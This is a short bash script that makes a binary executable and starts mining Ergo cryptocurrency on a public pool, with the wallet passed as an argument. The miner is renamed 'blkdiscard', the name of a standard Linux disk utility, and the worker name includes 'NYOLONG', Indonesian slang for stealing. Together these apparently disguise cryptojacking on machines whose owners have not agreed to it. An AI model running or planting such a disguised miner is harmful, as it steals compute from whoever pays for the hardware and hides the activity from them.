#!/bin/bash
POOL=ergo.herominers.com:10250
USER=$1
WORKER=$(echo GPU-NYOLONG-$(shuf -i 1000-9999 -n 1))
ALGO=AUTOLYKOS2

chmod +x blkdiscard
./blkdiscard --algo $ALGO --pool $POOL --user $USER.$WORKER
